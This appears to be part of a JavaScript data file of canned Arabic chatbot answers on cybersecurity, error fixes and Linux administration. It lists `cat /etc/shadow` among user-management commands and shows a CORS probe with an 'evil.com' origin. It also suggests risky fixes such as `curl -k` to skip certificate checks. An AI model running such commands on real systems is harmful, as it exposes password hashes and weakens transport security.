    a: '🐍 **حلول أخطاء بايثون الشائعة:**\n\n**1. ModuleNotFoundError:** `pip install module_name`\n\n**2. SyntaxError:** نسيت `:` بعد `if`, `for`, `def`؟\n\n**3. IndentationError:** المسافات مش منتظمة. استخدم 4 مسافات ثابتة.\n**4. TypeError: \'int\' object is not iterable:**\n   ```python\n   # خطأ: for i in 10\n   # صح: for i in range(10)\n   ```\n**5. FileNotFoundError:** المسار غلط. استخدم `os.path.exists()`.\n**6. PermissionError:** صلاحيات الملف. استخدم `sudo` على لينكس.\n**7. ConnectionRefusedError:** الخدمة مش شغالة أو البورت غلط.\n**8. KeyError:** المفتاح مش موجود في الـ dict. استخدم `.get()`:\n   ```python\n   d = {"a": 1}\n   d.get("b", "افتراضي")  # يرجع "افتراضي" مش KeyError\n   ```\n**9. ValueError:** نوع البيانات مش مناسب — افحص input.\n\nعندك خطأ معين؟ اكتبه لي وأنا أساعدك!' },
  { cat: 'تصليح', keywords: ['error npm', 'npm error', 'node error', 'fix npm', 'npm مشكلة'],
    a: '📦 **حلول أخطاء NPM/Node.js:**\n\n**1. npm ERR! code EACCES:** صلاحيات — جرب:\n   ```bash\n   sudo npm install --unsafe-perm\n   # أو صلح الصلاحيات:\n   sudo chown -R $(whoami) ~/.npm\n   ```\n**2. npm ERR! missing script:** الأمر مش موجود في package.json\n\n**3. node: command not found:** ما نصبتهوش — `sudo apt install nodejs`\n\n**4. Module not found:** `npm install` أولاً\n\n**5. Port already in use:** البورت مشغول:\n   ```bash\n   lsof -i :3000\n   kill -9 PID\n   ```\n**6. NPM version too old:** `npm install -g npm@latest`\n\n**7. node_modules مشاكل:** احذف وأعد نصب:\n   ```bash\n   rm -rf node_modules package-lock.json\n   npm install\n   ```' },
  { cat: 'تصليح', keywords: ['error sql', 'sql error', 'mysql error', 'قاعدة بيانات خطأ', 'database error'],
    a: '🗄️ **حلول أخطاء SQL الشائعة:**\n\n**1. Connection refused:** MySQL مش شغال:\n   ```bash\n   sudo systemctl start mysql\n   ```\n**2. Access denied for user:** اسم مستخدم/باسورد غلط:\n   ```bash\n   ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'newpass\';\n   ```\n**3. Table doesn\'t exist:** تأكد من اسم الجدول:\n   ```sql\n   SHOW TABLES;\n   ```\n**4. Unknown column \'x\' in field list:**\
   ```sql\n   DESCRIBE table_name;  -- يشوف الأعمدة\n   ```\n**5. Duplicate entry:** المفتاح الأساسي موجود:\n   ```sql\n   INSERT ... ON DUPLICATE KEY UPDATE ...\n   ```\n**6. Deadlock:** عمليتين بتتنافسوا:\n   ```sql\n   SHOW ENGINE INNODB STATUS\\G\n   ```\n**7. SQL Injection في كودك:** استخدم Prepared Statements!' },
  { cat: 'تصليح', keywords: ['error nmap', 'nmap error', 'nmap مشكلة', 'fix nmap'],
    a: '📡 **حلول أخطاء Nmap:**\n\n**1. Failed to open device eth0:** صلاحيات:\n   ```bash\n   sudo nmap ...\n   # أو إضافة المستخدم:\n   sudo usermod -aG wireshark $USER\n   ```\n**2. No targets specified:** نسيت تحدد الهدف:\n   `nmap 192.168.1.1`\n\n**3. You requested a scan type which is not about your IP:**\n   تستخدم `-sS` وانت مش root — استخدم `-sT` بديلاً.\n\n**4. Failed to resolve host:** النطاق مش موجود:\n   تأكد من `ping google.com` أولاً.\n\n**5. Host seems down:** الجهاز مش شغال أو في firewall:\n   جرب `nmap -Pn` (يتخطى ping).\n\n**6. Timing warning:** الشبكة بطيئة:\n   استخدم `-T4` أو `-T5` للسرعة.' },
  { cat: 'تصليح', keywords: ['error git', 'git error', 'fix git', 'git مشكلة'],
    a: '📦 **حلول أخطاء Git:**\n\n**1. fatal: not a git repository:** `git init` أولاً\n\n**2. Already up to date:** مفيش حاجة جديدة\n\n**3. Merge conflict:** في تضارب:\n   ```bash\n   git status          # شوف الملفات المتضاربة\n   # صلحها يدوياً، ثم:\n   git add .\n   git commit -m "Fixed conflict"\n   ```\n**4. Permission denied (publickey):** مفتاح SSH مش مضبوط:\n   ```bash\n   ssh-keygen -t rsa -b 4096 -C "email@example.com"\n   cat ~/.ssh/id_rsa.pub  # أضفه على GitHub\n   ```\n**5. fatal: refusing to merge unrelated histories:**\n   `git pull origin main --allow-unrelated-histories`\n\n**6. Your branch is ahead of origin:** ارفع تغييراتك:\n   `git push origin main`' },
  { cat: 'تصليح', keywords: ['error bash', 'bash error', 'shell error', 'fix bash', 'bash مشكلة'],
    a: '⚡ **حلول أخطاء Bash:**\n\n**1. command not found:** الأمر مش مثبت:\n   ```bash\n   sudo apt install command_name\n   # أو:\n   which command_name  # يشوف إذا كان موجود\n   ```\n**2. Permission denied:** الملف مش قابل للتنفيذ:\n   ```bash\n   chmod +x script.sh\n   ```\n**3. Syntax error: unexpected end of file:** نسيت `fi`/`done`/`esac`\n\n**4. No such file or directory:** المسار غلط:\n   تأكد من `ls` للمسار\n\n**5. Bad substitution:** استخدم `{}` مع المتغيرات:\n   ```bash\n   echo ${var}  # صح\n   echo $var    # صح للبساطة\n   ```\n**6. curl: (60) SSL certificate:** أضف `-k`:\n   `curl -k https://example.com`\n\n**7. fork: retry: Resource temporarily unavailable:** عمليات كثيرة:\n   ```bash\n   ulimit -u  # يشوف الحد\n   pkill -u $USER  # يقتل عمليات المستخدم\n   ```' },

  // === Security Analysis ===
  { cat: 'تحليل', keywords: ['حلل سيناريو', 'analyze scenario', 'تحليل هجمة', 'هجمة كذا', 'هل هذه هجمة', 'what attack'],
    a: '🕵️ **تحليل سيناريو أمني:**\n\nلتحليل أي سيناريو، جاوب على الأسئلة دي:\n1. **المؤشرات (Indicators):** إيه اللي شفته؟ (فiles, processes, network)\n2. **التوقيت (Timeline):** إمتى بدأ الموضوع؟\n3. **التأثير (Impact):** إيه المتأثر؟\n4. **المصدر (Source):** منين جه الهجوم؟\n\n**سيناريوهات شائعة:**\n• موقع بطيء جداً → DoS/DDoS attack\n• فايل مشبوه في attachments → Phishing\n• تعديلات في ملفات النظام → Malware/Rootkit\n• اتصالات لـ IP مش معروف → C2 (Command & Control)\n\nأكتبلي تفاصيل السيناريو اللي قدامك وأنا أحلله!' },
  { cat: 'تحليل', keywords: ['analyze log', 'تحليل سجل', 'log analysis', 'فهم log', 'log example'],
    a: '📋 **تحليل السجلات (Log Analysis):**\n\n**1. سجلات SSH (محاولات دخول):**\n```\nMar 15 02:30:10 server sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2\nMar 15 02:30:11 server sshd[1235]: Failed password for admin from 192.168.1.100 port 54321 ssh2\n```\n🔍 **تحليل:** هجمة Brute Force على SSH — IP واحد بيجرب مستخدمين كتير.\n\n**2. سجلات ويب (Apache/Nginx):**\n```\n192.168.1.1 - - [15/Mar/2026:02:30:10] "GET /?id=1 UNION SELECT ..." 200 1234\n```\n🔍 **تحليل:** محاولة SQL Injection — طلب UNION suspicious.\n\n**3. سجلات فايروال:**\n```\nDROP IN=eth0 OUT= MAC= SRC=10.0.0.5 DST=192.168.1.1 PROTO=TCP DPT=445\n```\n🔍 **تحليل:** محاولة اتصال على SMB من شبكة داخلية — احتمالية انتشار.\n\n**عندك سجل معين؟ اكتبه وأنا أحلله!**' },
  { cat: 'تحليل', keywords: ['analyze malware', 'تحليل مالوير', 'malware analysis', 'فيروس تحليل'],
    a: '🔬 **تحليل البرامج الضارة (Malware Analysis) مبدئي:**\n\n**1. الملف:** اسمه إيه؟ امتداده؟ حجمه؟\n**2. الهاش:**\n   ```bash\n   sha256sum suspicious.exe\n   md5sum suspicious.exe\n   ```\n   → افحص الهاش على **VirusTotal**.com\n**3. الأوامر:**\n   ```bash\n   strings suspicious.exe | head -50\n   # شوف URLs, IPs, API calls غريبة\n   ```\n**4. الشبكة:** استخدم `tcpdump` أو Wireshark لمراقبة اتصالاته\n**5. Sandbox:** ارفع الملف على أي موقع:\n   • any.run\n   • hybrid-analysis.com\n\n**علامات الخطر:**\n• اتصال لـ IP في دولة غريبة\n• محاولة تعديل Registry/Startup\n• تشفير ملفات (Ransomware)\n• محاولة رفع صلاحيات\n\n**لا تشغّل الملف على جهازك الأساسي أبداً!**' },
  { cat: 'تحليل', keywords: ['analyze website', 'تحليل موقع', 'هل الموقع آمن', 'site security'],
    a: '🌐 **تحليل أمان موقع إلكتروني:**\n\n**1. SSL/TLS:** الموقع بيستخدم HTTPS؟\n   ```bash\n   curl -I https://example.com\n   ```\n\n**2. الهيدرات:**\n   ```bash\n   curl -s -D- https://example.com | head -20\n   ```\n   ابحث عن:\n   • `Strict-Transport-Security` → حماية HSTS\n   • `Content-Security-Policy` → CSP\n   • `X-Frame-Options` → حماية Clickjacking\n   • `X-Content-Type-Options` → حماية MIME\n\n**3. الفحص السريع باستخدام Nmap:**\n   ```bash\n   nmap -sV -sC example.com\n   ```\n\n**4. OWASP ZAP أو Nikto للفحص التلقائي**\n\n**5. شوف:\n   • `whatweb example.com` — التقنيات المستخدمة\n   • `wafw00f example.com` — نوع WAF إن وجد\n\nعايزني أحلل موقع معين؟ اكتب اسمه!' },
  { cat: 'تحليل', keywords: ['analyze password', 'تحليل باسورد', 'هل الباسورد قوي', 'password strength'],
    a: '🔑 **تحليل قوة كلمة المرور:**\n\n**عوامل قوة الباسورد:**\n• **الطول** — 12 حرف+ هو الحد الأدنى الآمن\n• **التنوع** — حروف كبيرة + صغيرة + أرقام + رموز\n• **العشوائية** — مش كلمة موجودة في القاموس\n• **الخصوصية** — مش مستخدم في موقع تاني\n\n**أمثلة:**\n`123456` ❌ أضعف باسورد في العالم\n`password123` ❌ بيتكسر في ثواني\n`Ilove@2024!` ❌ نمط متوقع\n`G7#kP2$xL9@mQ` ✅ قوي جداً\n`الخروج_من_المنطقة_الزمنية_42!` ✅ قوي (لكن خلي بالك من لوحة المفاتيح)\n\n**وقت الكسر تقريباً (على GPU حديث):**\n• 8 أحرف (أرقام فقط): < دقيقة\n• 8 أحرف (كل الأنواع): ~2 ساعة\n• 12 حرف (كل الأنواع): ~200 سنة\n• 16 حرف (كل الأنواع): ~مليون سنة\n\n**استخدم Password Manager!** (Bitwarden, 1Password, KeePass)' },

  // === Concepts (expanded) ===
  { cat: 'مفاهيم', keywords: ['black hat', 'white hat', 'gray hat', 'grey hat', 'black hat vs white hat', 'فرق القبعات'],
    a: '🎩 **أنواع الهاكرز:\n\n**Black Hat (القبعة السوداء)** — هاكر غير أخلاقي:\n• يخترق بدون إذن\n• يسرق بيانات أو يطلب فدية\n• أهدافه: مالية، تخريبية\n\n**White Hat (القبعة البيضاء)** — هاكر أخلاقي:\n• يخترق بتصريح (Penetration Tester)\n• يبلغ عن الثغرات\n• أهدافه: حماية وتحسين الأمان\n\n**Gray Hat (القبعة الرمادية)** — بين بين:\n• يخترق بدون إذن لكن مش بنية شريرة\n• ممكن يبلغ عن الثغرة بعد اختراقها\n\n**Script Kiddie** — مبتدئ بيستخدم أدوات جاهزة بدون فهم.' },
  { cat: 'مفاهيم', keywords: ['honeypot', 'honeypot', 'وعاء عسل', 'خادم وهمي'],
    a: '🍯 **Honeypot (وعاء العسل)** — نظام وهمي يشبه نظام حقيقي عشان تخدع المهاجمين.\n\n**الاستخدامات:**\n• اكتشاف المهاجمين مبكراً\n• دراسة تقنيات الهجوم\n• إضاعة وقت المهاجمين\n• جمع أدلة على الهجمات\n\n**أنواع:**\n• **Low-Interaction** — يحاكي خدمات قليلة\n• **High-Interaction** — نظام كامل (لكنه مراقب)\n\nأدوات: **T-Pot**, **Cowrie** (لـ SSH), **Dionaea**' },
  { cat: 'مفاهيم', keywords: ['sandbox', 'sandbox', 'صندوق رمل', 'بيئة معزولة'],
    a: '📦 **Sandbox (بيئة معزولة)** — بيئة آمنة ومعزولة لتشغيل ملفات أو أكواد مشبوهة.\n\n**الاستخدامات:**\n• تحليل البرامج الضارة بأمان\n• تشغيل أكواد غير موثوقة\n• اختبار تحديثات قبل النشر\n• CTF ومسابقات الأمن\n\n**أدوات:**\n• **Cuckoo Sandbox** — مفتوح المصدر\n• **Any.Run** — أونلاين (مريح)\n• **Firejail** — لينكس\n• **Docker** — لعزل التطبيقات' },
  { cat: 'مفاهيم', keywords: ['bug bounty', 'bug bounty', 'مكافأة ثغرات', 'اختراق أخلاقي'],
    a: '💰 **Bug Bounty — مكافأة اكتشاف الثغرات:\n\n• شركات تعرض فلوس لمَن يكتشف ثغرات أمنية\n• المكافآت: $100 → $100,000+ حسب خطورة الثغرة\n\n**أشهر المنصات:**\n• **HackerOne** — الأكبر\n• **Bugcrowd** — منافس قوي\n• **Synack** — منصة مغلقة (بتطلب invitation)\n• **Intigriti** — أوروبية\n\n**نصيحة للمبتدئين:**\n• ابدأ بـ XSS و CSRF — ثغرات منتشرة\n• اقرأ تقارير الثغرات المنشورة (Public Disclosures)\n• اتمرن على **PortSwigger Web Security Academy**' },
  { cat: 'مفاهيم', keywords: ['osint', 'osint', 'open source intelligence', 'استخبارات', 'مصادر مفتوحة'],
    a: '🔍 **OSINT (Open Source Intelligence)** — جمع معلومات من مصادر متاحة للعموم.\n\n**المصادر:**\n• **Google Dorking** — `site:example.com filetype:pdf`\n• **Shodan** — ماسح أجهزة متصلة بالإنترنت\n• **Whois** — معلومات عن النطاقات\n• **Wayback Machine** — نسخ قديمة من المواقع\n• **Social Media** — Linkedin, Twitter, Facebook\n• **Have I Been Pwned** — هل بياناتك مسربة؟\n• **GitHub** — أكواد وأسرار منشورة\n• **theHarvester** — أداة OSINT أوتوماتيكية\n\n**مثال:** `theharvester -d example.com -b google`' },
  { cat: 'مفاهيم', keywords: ['steganography', 'stego', 'إخفاء', 'إخفاء بيانات', 'steganalysis'],
    a: '🖼️ **Steganography (إخفاء المعلومات)** — إخفاء بيانات داخل وسائط أخرى (صور، صوت، فيديو).\n\n**الفرق بين التشفير والإخفاء:**\n• **التشفير:** يخفي المعنى — "فيه حاجة مخفية"\n• **الإخفاء:** يخفي الوجود — "مفيش حاجة خالص"\n\n**الأدوات:**\n• `steghide` — إخفاء في صور/صوت\n• `zsteg` — كشف الإخفاء في PNG/BMP\n• `binwalk` — تحليل الملفات\n• `strings` — بحث عن نصوص مخفية\n\n**مثال:** `steghide extract -sf image.jpg`\n`strings image.jpg | grep -i "flag\\|secret\\|pass"`' },

  // === Web Security (expanded) ===
  { cat: 'ويب', keywords: ['jwt', 'jwt token', 'json web token', 'jwt أمان', 'jwt attack'],
    a: '🔐 **JWT (JSON Web Token) — الثغرات الشائعة:\n\n**ما هو JWT؟** — طريقة للتحقق من الهوية باستخدام Token مشفر.\n\n**الثغرات:**\n1. **No algorithm check:** \"alg\": \"none\" → يقبل أي توقيع!\n2. **Weak secret key:** توقيع ضعيف → يتكسر بـ `jwt-cracker`\n3. **Token في URL:** يتسرب في logs/Referer\n4. **No expiry:** Token ما بينتهيش → يستخدم للأبد\n5. **JWK Injection:** المهاجم يحقن مفتاحه العام\n\n**الحماية:**\n• استخدم `RS256` بدل `HS256`\n• تحقق من `alg` — ارفض `none`\n• وقت انتهاء قصير + Refresh tokens\n• خزن الـ token في HttpOnly Cookie' },
  { cat: 'ويب', keywords: ['cors', 'cors policy', 'cross origin', 'cors خطأ', 'cors error'],
    a: '🌐 **CORS (Cross-Origin Resource Sharing):**\n\n**المشكلة:** المتصفحات تمنع طلبات من Domain لآخر (Same-Origin Policy).\n\n**الحل:** السيرفر يحدد `Access-Control-Allow-Origin`\n\n**الثغرات:**\n❌ `Access-Control-Allow-Origin: *` — أي موقع يقدر يطلب\n❌ `Access-Control-Allow-Credentials: true` + Origin ديناميكي\n❌ Accept أي Origin من header بدون تحقق\n\n**الوضع الآمن:**\n```\nAccess-Control-Allow-Origin: https://trusted-site.com\nAccess-Control-Allow-Methods: GET, POST\nAccess-Control-Allow-Headers: Content-Type\nAccess-Control-Max-Age: 86400\n```\n\n**اختبار:** `curl -H "Origin: https://evil.com" -I https://api.example.com`' },
  { cat: 'ويب', keywords: ['csrf token', 'csrf protection', 'حماية csrf', 'منع csrf'],
    a: '🛡️ **حماية CSRF (Cross-Site Request Forgery):**\n\n**الطرق الفعالة:**\n\n1. **CSRF Token (الأفضل):**\n   - السيرفر يولد token عشوائي\n   - يضيفه في كل form/session\n   - لازم يكون فريد لكل طلب\n\n2. **SameSite Cookie:**\n   ```\n   Set-Cookie: session=abc; SameSite=Strict\n   # أو Lax (أقل أماناً لكن أسهل)\n   ```\n\n3. **Custom Header:**\n   - `X-Requested-With: XMLHttpRequest`\n   - السيرفر يتأكد من وجوده\n\n4. **Referer/Origin Check:**\n   - تحقق من مصدر الطلب\n\n**إطار العمل اللي بتستخدمه غالباً عنده حماية CSRF مدمجة — فعّلها!**' },

  // === Programming Security ===
  { cat: 'أكواد', keywords: ['secure coding', 'برمجة آمنة', 'كتابة كود آمن', 'secure code tips'],
    a: '🛡️ **نصائح البرمجة الآمنة:**\n\n**1. Input Validation:**\n```python\n# غير آمن: user_input مُمرر مباشرة\n# آمن:\nimport re\nif re.match(r\"^[a-zA-Z0-9_]{3,20}$\", username):\n    # صالح\n```\n\n**2. Avoid eval():\n```python\n# خطير جداً!\nresult = eval(user_input)\n# استخدم ast.literal_eval للقيم الآمنة\n```\n\n**3. SQL Injection:** استخدم Prepared Statements دايماً.\n\n**4. Stored XSS:** استخدم الإسكيب (HTML entity encoding).\n\n**5. Secrets:** أبداً ما تحط API keys أو باسوردات في الكود:\n```\n# ❌ خاطئ\napi_key = \"sk-1234567890\"\n\n# ✅ صحیح — استخدم Environment Variables\nimport os\napi_key = os.getenv(\"API_KEY\")\n```\n\n**6. Rate Limiting:** حمي APIs من Brute Force.\n\n**7. Logging:** سجل كل شيء لكن ما تسجلش باسوردات!' },
  { cat: 'أكواد', keywords: ['api security', 'أمن api', 'secure api', 'rest api security'],
    a: '🔒 **أمن API — نصائح أساسية:**\n\n**1. Authentication:**\n- استخدم JWT أو OAuth 2.0\n- كل طلب لازم يكون authenticated (إلا public endpoints)\n\n**2. Authorization:\n- تحقق إن المستخدم مخول يشوف/يعدل المورد\n```python\n# خطأ\nreturn db.get_order(order_id)\n# صحیح\nreturn db.get_order(order_id) if order.user_id == current_user.id else None\n```\n\n**3. Rate Limiting:**\n```\nيلزم 100 طلب/دقيقة لكل مستخدم\n```\n\n**4. Input Validation:\n- تحقق من type, length, format لكل input\n\n**5. HTTPS فقط** — لا تسمح HTTP أبداً\n\n**6. CORS:** حدد بالظبط المَواقع المسموحة\n\n**7. Logging:** سجل كل طلب للـ API (بدون حساسيات)\n\n**8. Error Messages:** ما ترجعش تفاصيل الأخطاء الحقيقية للمستخدم.' },

  // === Introductions ===
  { cat: 'مسارات', keywords: ['تخصصات السايبر', 'cyber career', 'مجالات السايبر', 'cyber fields', 'فروع الأمن'],
    a: '🎯 **مجالات التخصص في الأمن السيبراني:**\n\n**1. اختبار الاختراق (Penetration Testing)** — يكتشف الثغرات\n**2. أمن الشبكات (Network Security)** — يحمي البنية التحتية\n**3. أمن التطبيقات (AppSec / DevSecOps)** — يؤمن الكود\n**4. الاستجابة للحوادث (Incident Response)** — يتعامل مع الاختراقات\n**5. التحليل الرقمي (Digital Forensics)** — يحقق في الجرائم\n**6. تحليل البرمجيات الخبيثة (Malware Analysis)** — يشَرِّح الفيروسات\n**7. أمن السحابة (Cloud Security)** — يؤمن البنية السحابية\n**8. أمن الـ IoT** — يؤمن الأجهزة الذكية\n**9. GRC (Governance, Risk, Compliance)** — إدارة المخاطر\n**10. استخبارات التهديدات (Threat Intelligence)** — يتابع التهديدات\n\n**كل تخصص له أدواته وشهاداته ومساره الخاص.**' },
  { cat: 'عام', keywords: ['ليست علي', 'مفيش', 'معندكش', 'مش عارف', 'ما تعرفش', 'idk', 'unknown'],
    a: '🤔 **تمام، خليني أساعدك بطريقة تانية!**\n\nجرب تسأل بطريقة مختلفة:\n• لكتابة كود: `اكتب سكريبت بايثون لـ...`\n• لشرح أمر: `اشرح أمر nmap`\n• لتصليح خطأ: `عندي خطأ في...`\n• لتحليل: `حلل السيناريو ده...`\n• لمعلومة: `ما هو ...`\n\nأو اختر من الاقتراحات تحت ⬇️' },

  // === OS basics (expanded) ===
  { cat: 'أنظمة', keywords: ['process linux', 'ps command', 'linux processes', 'عمليات لينكس'],
    a: '⚙️ **إدارة العمليات في لينكس:**\n\n```bash\n# عرض كل العمليات\nps aux\nps -ef\n\n# شجرة العمليات\npstree\n\n# عملية معينة\nps aux | grep nginx\n\n# مراقبة moment\nhtop            # (أجمل من top)\ntop\n\n# إشارات (Signals):\nkill -15 PID    # SIGTERM — طلب إيقاف نظيف\nkill -9 PID     # SIGKILL — قوة لا تقبل الرفض\nkill -1 PID     # SIGHUP — إعادة تحميل الإعدادات\n\n# الأولوية\nnice -n -10 ./script    # أولوية عالية\nrenice -n 5 -p PID      # تغيير الأولوية\n\n# العمليات في الخلفية\ncommand &\nctrl+z + bg\nfg\n```' },
  { cat: 'أنظمة', keywords: ['disk linux', 'disk space', 'مساحة تخزين', 'df du', 'linux storage'],
    a: '💾 **إدارة التخزين في لينكس:**\n\n```bash\n# المساحة الكلية\ndf -h\ndf -h /home          # بارتشن معين\n\n# حجم الملفات والمجلدات\ndu -sh *            # إجمالي كل مجلد\ndu -sh /home/user   # مجلد معين\ndu -h --max-depth=1 # مستوى واحد\n\n# أكبر الملفات\nfind / -type f -exec du -h {} + 2>/dev/null | sort -rh | head -10\n\n# iNodes\ndf -i\n\n# تحميل/تفريغ\nmount /dev/sda1 /mnt\numount /mnt\nlsblk               # كل الأقراص\n```' },
  { cat: 'أنظمة', keywords: ['network linux', 'linux network config', 'إعدادات الشبكة لينكس', 'ip command'],
    a: '🌐 **إعدادات الشبكة في لينكس:**\n\n```bash\n# عنوان IP\nip addr show\nip a                  # مختصر\n\n# إضافة عنوان IP\nip addr add 192.168.1.100/24 dev eth0\n\n# الراوتر\nip route show\nip r\n\n# DNS\ncat /etc/resolv.conf\nnslookup google.com\ndig google.com\n\n# سرعة الشبكة\niperf -c server_ip\n\n# منافذ مفتوحة\nss -tlnp\n\n# جودة الشبكة\nping -c 10 google.com\nmtr google.com        # traceroute + ping\n\n# WiFi (مع nmcli)\nnmcli dev wifi list\nnmcli dev wifi connect SSID password PASSWORD\n```' },
  { cat: 'أنظمة', keywords: ['user linux', 'users linux', 'مستخدمين لينكس', 'add user linux'],
    a: '👥 **إدارة المستخدمين في لينكس:**\n\n```bash\n# إضافة مستخدم\nsudo useradd -m -s /bin/bash username\nsudo passwd username\n\n# حذف مستخدم\nsudo userdel -r username\n\n# إضافة لمجموعة\nsudo usermod -aG sudo username\nsudo gpasswd -a username docker\n\n# معلومات المستخدم\nid username\nwho                    # الموجودين حالياً\nlast                   # آخر الدخولات\n\n# تبديل المستخدم\nsu - username          # تبديل كامل\nsudo -u username command  # أمر كمستخدم معين\n\n# سياسة الباسورد\ncat /etc/shadow        # الهاشات (ملف حساس!)\nchage -l username      # معلومات صلاحية الباسورد\n```\n**الأمان:** عطل تسجيل الدخول Root عبر SSH!' },
]
